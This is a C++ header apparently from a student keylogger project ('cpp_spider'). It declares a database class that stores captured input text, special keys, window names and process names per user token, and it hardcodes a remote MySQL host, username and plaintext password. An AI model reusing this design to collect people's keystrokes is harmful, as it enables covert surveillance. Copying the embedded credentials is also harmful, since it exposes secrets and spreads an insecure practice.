//
// Created by wurtz on 9/25/17.
//

#ifndef CPP_SPIDER_DATABASE_HPP
#define CPP_SPIDER_DATABASE_HPP

#include <iostream>
#include <cppconn/driver.h>
#include <cppconn/resultset.h>
#include <cppconn/statement.h>
#include <cppconn/exception.h>
#include <sstream>
#include <vector>
#include <chrono>
#include "Log.hpp"

#define HOST "spiderloger.tk"
#define PORT 3360
#define DATABASE "spider"
#define USER "spider"
#define PASSWORD "0fKszk01CF3HfOYq"

struct DatabaseInfo
{
  std::string   _host = HOST;
  int           _port = PORT;
  std::string   _database = DATABASE;
  std::string   _user = USER;
  std::string   _password = PASSWORD;
};

class Database
{
private:
    sql::Connection         *_connection;

private:
    void                executeQuery(const std::string &query);
    sql::ResultSet      *executeQueryResponse(const std::string &query);

    void                executePostLog(const std::string &token,
                                       std::map<std::string, std::string> data);

public:
    Database(const DatabaseInfo &databaseInfo);
    ~Database();

    void                postUser(const std::string &token);
    void                postLog(const std::string &token,
                                Log &log);

    std::vector<std::map<std::string, std::string>>     getUser(const std::string &token = "",
                                                                const std::string &accountName = "",
                                                                const int &row = 0);
    std::vector<std::map<std::string, std::string>>     getLog(const std::string &token = "",
                                                               const std::string &inputText = "",
                                                               const std::string &inputSpecial = "",
                                                               const std::string &datetime = "",
                                                               const std::string &windowName = "",
                                                               const std::string &processName = "",
                                                               const int &row = 0);
};

#endif //CPP_SPIDER_DATABASE_HPP